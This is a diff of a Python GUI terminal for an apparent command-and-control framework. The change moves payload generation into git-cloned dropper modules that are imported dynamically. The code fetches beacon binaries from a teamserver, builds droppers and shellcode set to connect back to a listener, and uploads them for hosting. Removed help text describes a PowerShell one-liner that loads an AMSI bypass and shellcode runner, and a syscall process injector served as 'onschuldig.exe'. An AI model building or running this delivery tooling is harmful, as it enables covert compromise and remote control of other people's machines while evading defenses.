@@ -13,30 +13,57 @@ from PyQt5.QtCore import *
 
 from grpcClient import *
 
+from git import Repo 
+
 
 #
 # Dropper modules
 #
-if os.path.exists(os.path.join(os.getcwd(), 'PowershellWebDelivery')):
-    sys.path.insert(1, './PowershellWebDelivery/')
-    import GeneratePowershellLauncher
+dropperModulesDir = "./DropperModules"
 
-if os.path.exists(os.path.join(os.getcwd(), 'PeDropper')):
-    sys.path.insert(1, './PeDropper/')
-    import GenerateDropperBinary
+if not os.path.exists(dropperModulesDir):
+    os.makedirs(dropperModulesDir)
 
-if os.path.exists(os.path.join(os.getcwd(), 'GoDroplets')):
-    sys.path.insert(1, './GoDroplets/')
-    import GoDroplets.scripts.GenerateGoDroplets as GenerateGoDroplets
+with open("DropperModules.conf", "r") as file:
+    repositories = file.readlines()
 
-if os.path.exists(os.path.join(os.getcwd(), 'PeInjectorSyscall')):
-    sys.path.insert(1, './PeInjectorSyscall/')
-    import GenerateInjector
+DropperModules = []
+for repo in repositories:
+    repo = repo.strip()
+    repoName = repo.split('/')[-1].replace('.git', '')
+    repoPath = os.path.join(dropperModulesDir, repoName)
 
-sys.path.insert(1, './Batcave')
+    if not os.path.exists(repoPath):
+        print(f"Cloning {repoName} in {repoPath}.")
+        try:
+            Repo.clone_from(repo, repoPath)
+        except Exception as e:
+                print(f"Failed to clone {repoName}: {e}")
+    else:
+        print(f"Repository {repoName} already exists in {dropperModulesDir}.")
+
+for moduleName in os.listdir(dropperModulesDir):
+    modulePath = os.path.join(dropperModulesDir, moduleName)
+    
+    if os.path.isdir(modulePath):
+        if os.path.exists(modulePath):
+            sys.path.insert(1, modulePath)
+            try:
+                # Dynamically import the module
+                importedModule = __import__(moduleName)
+                DropperModules.append(importedModule)
+                print(f"Successfully imported {moduleName}")
+            except ImportError as e:
+                print(f"Failed to import {moduleName}: {e}")
+
+
+#
+# Terminal modules
+#
+sys.path.insert(1, './TerminalModules/Batcave')
 import batcave
 
-sys.path.insert(1, './Credentials')
+sys.path.insert(1, './TerminalModules/Credentials')
 import credentials
 
 
@@ -54,7 +81,8 @@ GrpcPutIntoUploadDirInstruction = "putIntoUploadDir"
 GrpcInfoListenerInstruction = "infoListener"
 GrpcBatcaveUploadToolInstruction = "batcaveUpload"
 
-BeaconHttpFile = "BeaconHttp.exe"
+BeaconFileWindows = "Beacon.exe"
+BeaconFileLinux = "Beacon"
 
 ErrorInstruction = "Error"
 
@@ -68,44 +96,10 @@ exemple:
 - Batcave BundleInstall recon
 - Batcave Search rec"""
 
-GenerateInstruction = "Generate"
-GenerateHelp = """Generate:
-Generate a payload to deploy a beacon and store it on the client:
-exemple:
-- Generate WindowsExecutable listenerHash exe/dll/svc
-- Generate GoWindowsExecutable listenerHash exe/dll/svc"""
+DropperInstruction = "Dropper"
 
-WindowsExecutableInstruction = "WindowsExecutable"
-WindowsExecutableHelp = """Generate WindowsExecutable:
-Generate WindowsExecutable, generate 2 modules dropper, one EXE and one DLL from the appropriate beacon link to the given listener:
-exemple:
-- Generate WindowsExecutable listenerHash"""
-
-GoWindowsExecutableInstruction = "GoWindowsExecutable"
-GoWindowsExecutableHelp = """Generate GoWindowsExecutable:
-Generate GoWindowsExecutable, generate 3 modules dropper compiled with go, one EXE, one DLL and one SVC from the appropriate beacon link to the given listener:
-exemple:
-- Generate GoWindowsExecutable listenerHash"""
-
-GenerateAndHostInstruction = "GenerateAndHost"
-GenerateAndHostHelp = """GenerateAndHost:
-GenerateAndHost a playload that is store on the teamserver to be downloaded by a web request from a web listener (http/https):
-exemple:
-- GenerateAndHost PowershellWebDelivery listenerHash hostListenerHash
-- GenerateAndHost PeInjectorSyscall processToInject listenerHash hostListenerHash"""
-
-PowershellWebDeliveryInstruction = "PowershellWebDelivery"
-PowershellWebDeliveryHelp = """GenerateAndHost PowershellWebDelivery:
-Generate a powershell oneliner to download a AMSI bypass and a shellcode runner from a listener. The shellcode runner launch a beacon configured to connect back to the specified listener.
-exemple:
-- GenerateAndHost PowershellWebDelivery listenerHash
-- GenerateAndHost PowershellWebDelivery listenerHash hostListenerHash"""
-
-PeInjectorSyscallInstruction = "PeInjectorSyscall"
-PeInjectorSyscallHelp = """GenerateAndHost PeInjectorSyscall:
-exemple:
-- GenerateAndHost PeInjectorSyscall processToInject listenerHash
-- GenerateAndHost PeInjectorSyscall processToInject listenerHash hostListenerHash"""
+DropperModuleGetHelpFunction = "getHelpExploration"
+DropperModuleGeneratePayloadFunction = "generatePayloadsExploration"
 
 HostInstruction = "Host"
 HostHelp="""Host:
@@ -129,8 +123,7 @@ SearchSubInstruction = "search"
 def getHelpMsg():
     helpText  = HelpInstruction+"\n"
     helpText += HostInstruction+"\n"
-    helpText += GenerateInstruction+"\n"
-    helpText += GenerateAndHostInstruction+"\n"
+    helpText += DropperInstruction+"\n"
     helpText += BatcaveInstruction+"\n"
     helpText += CredentialStoreInstruction
     return helpText
@@ -138,14 +131,7 @@ def getHelpMsg():
 completerData = [
     (HelpInstruction,[]),
     (HostInstruction,[]),
-    (GenerateInstruction,[
-            (WindowsExecutableInstruction,[]),
-            (GoWindowsExecutableInstruction,[]),
-             ]),
-    (GenerateAndHostInstruction,[
-            (PowershellWebDeliveryInstruction,[]),
-            ('PeInjectorSyscall',[]),
-             ]),
+    (DropperInstruction,[]),
     (BatcaveInstruction, [
             ("Install", []),
             ("BundleInstall", []),
@@ -245,14 +231,14 @@ class Terminal(QWidget):
                 self.runHelp()
             elif instructions[0]==BatcaveInstruction:
                 self.runBatcave(commandLine, instructions)
-            elif instructions[0]==GenerateInstruction:
-                self.runGenerate(commandLine, instructions)
-            elif instructions[0]==GenerateAndHostInstruction:
-                self.runGenerateAndHost(commandLine, instructions)
             elif instructions[0]==HostInstruction:
                 self.runHost(commandLine, instructions)
             elif instructions[0]==CredentialStoreInstruction:
                 self.runCredentialStore(commandLine, instructions)
+            elif instructions[0]==DropperInstruction:
+                self.runDropper(commandLine, instructions)
+            
+            
             else:
                 self.printInTerminal(commandLine, ErrorCmdUnknow)
 
@@ -263,6 +249,9 @@ class Terminal(QWidget):
         self.printInTerminal(HelpInstruction, getHelpMsg())
 
 
+    #
+    # Batcave
+    # 
     def runBatcave(self, commandLine, instructions):
         if len(instructions) < 3:
             self.printInTerminal(commandLine, BatcaveHelp)
@@ -329,7 +318,9 @@ class Terminal(QWidget):
             self.printInTerminal(commandLine, ErrorCmdUnknow)
             return     
 
-
+    #
+    # CredentialStore
+    # 
     def runCredentialStore(self, commandLine, instructions):
         if len(instructions) < 2:
             self.printInTerminal(commandLine, CredentialStoreHelp)
@@ -444,26 +435,79 @@ class Terminal(QWidget):
 
 
     #
-    # runGenerate
-    #   
-    def runGenerate(self, commandLine, instructions):
+    # runDropper 
+    #
+    def runDropper(self, commandLine, instructions):
         if len(instructions) < 2:
-            self.printInTerminal(commandLine, GenerateHelp)
-            return; 
+            availableModules = "Available dropper:\n"
+            for module in DropperModules:
+                availableModules += module.__name__ + "\n"
+            self.printInTerminal(commandLine, availableModules)
+            return;
 
-        mode = instructions[1]
-        if mode == WindowsExecutableInstruction or mode == GoWindowsExecutableInstruction:
-            if len(instructions) < 3 and mode == WindowsExecutableInstruction:
-                self.printInTerminal(commandLine, WindowsExecutableHelp)
-                return; 
+        moduleName = instructions[1]
+
+        moduleFound = False
+        for module in DropperModules:
+
+            if moduleName == module.__name__:
+                moduleFound = True
+
+                if len(instructions) < 4:
+                    helpText = ""
+                    getHelp = getattr(module, DropperModuleGetHelpFunction)
+                    helpText += getHelp()
+                    self.printInTerminal(commandLine, helpText)
+                    return;
             
-            elif len(instructions) < 3 and mode == GoWindowsExecutableInstruction:
-                self.printInTerminal(commandLine, GoWindowsExecutableHelp)
-                return; 
+                listenerDownload = instructions[2]
+                listenerBeacon = instructions[3]
+                additionalArgss = " ".join(instructions[4:])
 
-            listener = instructions[2]
+                print("moduleName", moduleName)
+                print("listenerDownload", listenerDownload)
+                print("listenerBeacon", listenerBeacon)
+                print("additionalArgs", additionalArgss)
 
-            commandTeamServer = GrpcInfoListenerInstruction+" "+listener
+                self.printInTerminal(commandLine, InfoProcessing)
+                thread = Thread(target = self.GenerateAndHostGeneric, args = (commandLine, moduleName, listenerDownload, listenerBeacon, additionalArgss))
+                thread.start()
+    
+        if moduleFound == False:
+            self.printInTerminal(commandLine, ErrorCmdUnknow)
+            return;
+
+
+    #
+    # Generic dropper module
+    #
+    def GenerateAndHostGeneric(self, commandLine, moduleName, listenerDownload, listenerBeacon, additionalArgs):
+        commandTeamServer = GrpcInfoListenerInstruction+" "+listenerDownload
+        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
+        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
+
+        result = resultTermCommand.result
+        if ErrorInstruction in result:
+            self.printInTerminal(commandLine, result)
+            return        
+
+        results = result.split("\n")
+        if len(results)<4:
+            return
+
+        schemeDownload = results[0]
+        ipDownload = results[1]
+        portDownload = results[2]
+        downloadPath = results[3]
+        if not downloadPath:
+            self.printInTerminal(commandLine, ErrorListener)
+            return
+
+        if downloadPath[0]=="/":
+            downloadPath = downloadPath[1:]
+
+        if  listenerBeacon != listenerDownload:
+            commandTeamServer = GrpcInfoListenerInstruction+" "+listenerBeacon
             termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
             resultTermCommand = self.grpcClient.sendTermCmd(termCommand)    
 
@@ -479,342 +523,95 @@ class Terminal(QWidget):
             scheme = results[0]
             ip = results[1]
             port = results[2]
+        else:
+            scheme=schemeDownload
+            ip=ipDownload
+            port=portDownload
 
-            commandTeamServer = GrpcGetBeaconBinaryInstruction+" "+listener
-            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
+        targetOs = "windows"
+        for module in DropperModules:
+            if module.__name__ == moduleName:
+                try:
+                    getTargetOs = getattr(module, "getTargetOsExploration")
+                    print(getTargetOs)
+                    targetOs = getTargetOs()
+                    print(targetOs)
+                except AttributeError:
+                    targetOs = "windows"
+
+        commandTeamServer = GrpcGetBeaconBinaryInstruction+" "+listenerBeacon+" "+targetOs
+        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
+        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
+
+        result = resultTermCommand.result
+        if ErrorInstruction in result:
+            self.printInTerminal(commandLine, result)
+            return   
+
+        if targetOs == "windows":
+            beaconFilePath = "./"+BeaconFileWindows
+        else:
+            beaconFilePath = "./"+BeaconFileLinux
+        beaconFile = open(beaconFilePath, "wb")
+        beaconFile.write(resultTermCommand.data)
+
+        beaconArg = ip+" "+port
+        if scheme==HttpType or scheme==HttpsType:
+            beaconArg = beaconArg+" "+scheme
+
+        urlDownload =  schemeDownload + "://" + ipDownload + ":" + portDownload + "/" + downloadPath
+
+        # Generate the payload
+        droppersPath = []
+        shellcodesPath = []
+        cmdToRUn = ""
+        for module in DropperModules:
+            if module.__name__ == moduleName:
+                genPayload = getattr(module, DropperModuleGeneratePayloadFunction)
+                droppersPath, shellcodesPath, cmdToRUn = genPayload(beaconFilePath, beaconArg, "", urlDownload, additionalArgs.split(" "))
+
+        # Upload the file and get the path
+        for dropperPath in droppersPath:
+            try:
+                with open(dropperPath, mode='rb') as fileDesc:
+                    payload = fileDesc.read()
+            except IOError:
+                self.printInTerminal(commandLine, ErrorFileNotFound)
+                return  
+
+            filename = os.path.basename(dropperPath)
+            commandTeamServer = GrpcPutIntoUploadDirInstruction+" "+listenerDownload+" "+filename
+            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
             resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
 
             result = resultTermCommand.result
             if ErrorInstruction in result:
                 self.printInTerminal(commandLine, result)
-                return   
-
-            print("Beacon size", len(resultTermCommand.data))
-            beaconFilePath = "./"+BeaconHttpFile
-            beaconFile = open(beaconFilePath, "wb")
-            beaconFile.write(resultTermCommand.data)
-
-            beaconArg = ip+" "+port
-            if scheme==HttpType or scheme==HttpsType:
-                beaconArg = beaconArg+" "+scheme
-
-            if mode == GoWindowsExecutableInstruction:
-                formatOutput = "all"                    
-                if len(instructions) >= 4 and (instructions[3] in ["exe","dll","svc","all"]) :
-                    formatOutput = instructions[3]
-
-                exeName = listener+"_"+scheme
-
-                self.printInTerminal(commandLine, InfoProcessing)
-                thread = Thread(target = self.GenerateGoDroplets, args = (commandLine, beaconFilePath, beaconArg, formatOutput, exeName))
-                thread.start()
-                return
-
-            elif mode == WindowsExecutableInstruction:
-                self.printInTerminal(commandLine, InfoProcessing)
-                thread = Thread(target = self.GenerateDropperBinary, args = (commandLine, beaconFilePath, beaconArg))
-                thread.start()
-                return
+                return  
             
-        else:
-            self.printInTerminal(commandLine, ErrorCmdUnknow)
-            return;
+        for shellcodePath in shellcodesPath:
+            try:
+                with open(shellcodePath, mode='rb') as fileDesc:
+                    payload = fileDesc.read()
+            except IOError:
+                self.printInTerminal(commandLine, ErrorFileNotFound)
+                return  
 
-    #
-    # GenerateGoDroplets
-    #
-    def GenerateGoDroplets(self, commandLine,  beaconFilePath, beaconArg, formatOutput, exeName):
-        dropperExePath, dropperDllPath = GenerateDropperBinary.generatePayloads(beaconFilePath, beaconArg, "")
-
-        result = GenerateGoDroplets.generateGoDroplets(beaconFilePath, beaconArg, formatOutput, exeName)
-
-        if not "".join(result):
-            self.printInTerminal(commandLine, "Error: GoWindowsExecutable failed. Check if go is correctly installed.")
-            return   
-        
-        self.printInTerminal(commandLine, ("\n").join(result))
-        return
-
-    #
-    # GenerateDropperBinary
-    #
-    def GenerateDropperBinary(self, commandLine,  beaconFilePath, beaconArg):
-        dropperExePath, dropperDllPath = GenerateDropperBinary.generatePayloads(beaconFilePath, beaconArg, "")
-
-        result =  "Dropper EXE path: " + dropperExePath + "\n"
-        result += "Dropper DLL path: " + dropperDllPath 
-        self.printInTerminal(commandLine, result)
-        return
-
-    #
-    # GenerateAndHost 
-    #
-    def runGenerateAndHost(self, commandLine, instructions):
-        if len(instructions) < 2:
-            self.printInTerminal(commandLine, GenerateAndHostHelp)
-            return;
-
-        mode = instructions[1]
-
-        if mode == PowershellWebDeliveryInstruction:
-            if len(instructions) < 3:
-                self.printInTerminal(commandLine, PowershellWebDeliveryHelp)
-                return;
-            
-            # should take 2 listeners: 
-            #   the http/https listener to download the payload from
-            #   one listner for the beacon to connect to
-            listenerBeacon = instructions[2]
-            if  len(instructions) >= 4:
-                listenerDownload = instructions[3]
-            else:
-                listenerDownload = listenerBeacon
-
-            self.printInTerminal(commandLine, InfoProcessing)
-            thread = Thread(target = self.GenerateAndHostPowershellWebDelivery, args = (commandLine, listenerDownload, listenerBeacon))
-            thread.start()
-
-        elif mode == PeInjectorSyscallInstruction:
-            if len(instructions) < 4:
-                self.printInTerminal(commandLine, PeInjectorSyscallHelp)
-                return;
-            
-            # should take 2 listeners: 
-            #   the http/https listener to download the payload from
-            #   one listner for the beacon to connect to
-            processToInject = instructions[2]
-            listenerBeacon = instructions[3]
-            if  len(instructions) >= 5:
-                listenerDownload = instructions[4]
-            else:
-                listenerDownload = listenerBeacon
-
-            self.printInTerminal(commandLine, InfoProcessing)
-            thread = Thread(target = self.GenerateAndHostPeInjectorSyscall, args = (commandLine, listenerDownload, listenerBeacon, processToInject))
-            thread.start()
-    
-        else:
-            self.printInTerminal(commandLine, ErrorCmdUnknow)
-            return;
-
-
-    #
-    # GenerateAndHostPowershellWebDelivery
-    #
-    def GenerateAndHostPowershellWebDelivery(self, commandLine,  listenerDownload, listenerBeacon):
-        commandTeamServer = GrpcInfoListenerInstruction+" "+listenerDownload
-        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
-        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
-
-        result = resultTermCommand.result
-        if ErrorInstruction in result:
-            self.printInTerminal(commandLine, result)
-            return        
-
-        results = result.split("\n")
-        if len(results)<4:
-            return
-
-        schemeDownload = results[0]
-        ipDownload = results[1]
-        portDownload = results[2]
-        downloadPath = results[3]
-        if not downloadPath:
-            self.printInTerminal(commandLine, ErrorListener)
-            return
-
-        if downloadPath[0]=="/":
-            downloadPath = downloadPath[1:]
-
-        if  listenerBeacon != listenerDownload:
-            commandTeamServer = GrpcInfoListenerInstruction+" "+listenerBeacon
-            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
-            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)    
+            filename = os.path.basename(shellcodePath)
+            commandTeamServer = GrpcPutIntoUploadDirInstruction+" "+listenerDownload+" "+filename
+            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
+            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
 
             result = resultTermCommand.result
             if ErrorInstruction in result:
                 self.printInTerminal(commandLine, result)
-                return   
-
-            results = result.split("\n")
-            if len(results)<4:
-                return
-
-            scheme = results[0]
-            ip = results[1]
-            port = results[2]
-        else:
-            scheme=schemeDownload
-            ip=ipDownload
-            port=portDownload
-
-        commandTeamServer = GrpcGetBeaconBinaryInstruction+" "+listenerBeacon
-        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
-        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
-
-        result = resultTermCommand.result
-        if ErrorInstruction in result:
-            self.printInTerminal(commandLine, result)
-            return   
-
-        print("Beacon size", len(resultTermCommand.data))
-        beaconFilePath = "./"+BeaconHttpFile
-        beaconFile = open(beaconFilePath, "wb")
-        beaconFile.write(resultTermCommand.data)
-
-        beaconArg = ip+" "+port
-        if scheme==HttpType or scheme==HttpsType:
-            beaconArg = beaconArg+" "+scheme
-
-        # Generate the 2 files
-        payloadAmsi, payloadShellcodeRunner = GeneratePowershellLauncher.generatePayloads(beaconFilePath, beaconArg, "")
-
-        # Upload the 2 files and get the path
-        filename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
-        pathAmsiBypass = downloadPath
-        pathAmsiBypass = pathAmsiBypass + filename
-        commandTeamServer = GrpcPutIntoUploadDirInstruction+" "+listenerDownload+" "+filename
-        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payloadAmsi.encode("utf-8"))
-        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
-
-        result = resultTermCommand.result
-        if ErrorInstruction in result:
-            self.printInTerminal(commandLine, result)
-            return  
-
-        filename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
-        pathShellcodeRunner = downloadPath
-        pathShellcodeRunner = pathShellcodeRunner + filename
-        commandTeamServer = GrpcPutIntoUploadDirInstruction+" "+listenerDownload+" "+filename
-        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payloadShellcodeRunner.encode("utf-8"))
-        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
-
-        result = resultTermCommand.result
-        if ErrorInstruction in result:
-            self.printInTerminal(commandLine, result)
-            return  
-
-        # upload the 2 file to the server, get the url to reach them
-        # generate the oneliner
-        oneLiner = GeneratePowershellLauncher.generateOneLiner(ipDownload, portDownload, scheme, pathAmsiBypass, pathShellcodeRunner)
-        self.printInTerminal(commandLine, oneLiner)
-
-
-    #
-    # GenerateAndHostPeInjectorSyscall
-    #
-    def GenerateAndHostPeInjectorSyscall(self, commandLine,  listenerDownload, listenerBeacon, processToInject):
-        commandTeamServer = GrpcInfoListenerInstruction+" "+listenerDownload
-        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
-        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
-
-        result = resultTermCommand.result
-        if ErrorInstruction in result:
-            self.printInTerminal(commandLine, result)
-            return        
-
-        results = result.split("\n")
-        if len(results)<4:
-            return
-
-        schemeDownload = results[0]
-        ipDownload = results[1]
-        portDownload = results[2]
-        downloadPath = results[3]
-        if not downloadPath:
-            self.printInTerminal(commandLine, ErrorListener)
-            return
-
-        if downloadPath[0]=="/":
-            downloadPath = downloadPath[1:]
-
-        if  listenerBeacon != listenerDownload:
-            commandTeamServer = GrpcInfoListenerInstruction+" "+listenerBeacon
-            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
-            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)    
-
-            result = resultTermCommand.result
-            if ErrorInstruction in result:
-                self.printInTerminal(commandLine, result)
-                return   
-
-            results = result.split("\n")
-            if len(results)<4:
-                return
-
-            scheme = results[0]
-            ip = results[1]
-            port = results[2]
-        else:
-            scheme=schemeDownload
-            ip=ipDownload
-            port=portDownload
-
-        commandTeamServer = GrpcGetBeaconBinaryInstruction+" "+listenerBeacon
-        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
-        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
-
-        result = resultTermCommand.result
-        if ErrorInstruction in result:
-            self.printInTerminal(commandLine, result)
-            return   
-
-        print("Beacon size", len(resultTermCommand.data))
-        beaconFilePath = "./"+BeaconHttpFile
-        beaconFile = open(beaconFilePath, "wb")
-        beaconFile.write(resultTermCommand.data)
-
-        beaconArg = ip+" "+port
-        if scheme==HttpType or scheme==HttpsType:
-            beaconArg = beaconArg+" "+scheme
-
-        # Generate the 2 files
-        process = processToInject
-        filename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))
-        urlStage =  schemeDownload + "://" + ipDownload + ":" + portDownload + "/" + downloadPath + filename
-
-        if not os.path.exists(os.path.join(os.getcwd(), 'PeInjectorSyscall')):
-            self.printInTerminal(commandLine, "PeInjectorSyscall module not found")
-            return  
-
-        dropperExePath, shellcodePath = GenerateInjector.generatePayloads(beaconFilePath, beaconArg, "", process, urlStage, " ")
-
-        # Upload the file and get the path
-        try:
-            with open(dropperExePath, mode='rb') as fileDesc:
-                payload = fileDesc.read()
-        except IOError:
-            self.printInTerminal(commandLine, ErrorFileNotFound)
-            return  
-
-        commandTeamServer = GrpcPutIntoUploadDirInstruction+" "+listenerDownload+" "+"onschuldig.exe"
-        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
-        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
-
-        result = resultTermCommand.result
-        if ErrorInstruction in result:
-            self.printInTerminal(commandLine, result)
-            return  
+                return  
                 
-        try:
-            with open(shellcodePath, mode='rb') as fileDesc:
-                payload = fileDesc.read()
-        except IOError:
-            self.printInTerminal(commandLine, ErrorFileNotFound)
-            return  
-
-        commandTeamServer = GrpcPutIntoUploadDirInstruction+" "+listenerDownload+" "+filename
-        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
-        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
-
-        result = resultTermCommand.result
-        if ErrorInstruction in result:
-            self.printInTerminal(commandLine, result)
-            return  
-                
-        result =  schemeDownload + "://" + ipDownload + ":" + portDownload + "/" + downloadPath + "onschuldig.exe"
+        result = cmdToRUn 
         self.printInTerminal(commandLine, result)
 
+
+    # setCursorEditorAtEnd
     def setCursorEditorAtEnd(self):
         cursor = self.editorOutput.textCursor()
         cursor.movePosition(QTextCursor.End,)
